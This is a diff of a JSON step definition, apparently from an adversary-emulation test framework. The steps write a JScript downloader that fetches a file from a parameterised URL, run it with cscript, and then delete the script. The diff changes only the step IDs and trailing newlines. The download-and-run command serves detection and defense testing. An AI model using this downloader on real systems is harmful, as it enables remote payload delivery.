@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "a45d082b-13b7-4dde-8fca-9b2c769cab51",
+      "id": "5ceef040-2495-4616-abcf-291d40bbeb93",
       "type": "execute-command",
       "data": {
-        "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); \u003e #{script_file}\ncscript //E:Jscript #{script_file}\n",
+        "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); \u003e #{script_file}\ncscript //E:Jscript #{script_file}",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "5824a900-b96c-46b8-8e98-ad84363931e0",
+      "id": "42bf39ff-d2a4-4ee0-a51a-fcfce3f1f61b",
       "type": "execute-command",
       "data": {
-        "command": "del #{script_file} /F /Q \u003enul 2\u003e\u00261\n",
+        "command": "del #{script_file} /F /Q \u003enul 2\u003e\u00261",
         "command_type": "command_prompt"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "a45d082b-13b7-4dde-8fca-9b2c769cab51",
+      "s": "5ceef040-2495-4616-abcf-291d40bbeb93",
       "p": "on-success",
-      "o": "5824a900-b96c-46b8-8e98-ad84363931e0"
+      "o": "42bf39ff-d2a4-4ee0-a51a-fcfce3f1f61b"
     },
     {
-      "s": "a45d082b-13b7-4dde-8fca-9b2c769cab51",
+      "s": "5ceef040-2495-4616-abcf-291d40bbeb93",
       "p": "on-failure",
-      "o": "5824a900-b96c-46b8-8e98-ad84363931e0"
+      "o": "42bf39ff-d2a4-4ee0-a51a-fcfce3f1f61b"
     }
   ],
   "tags": [
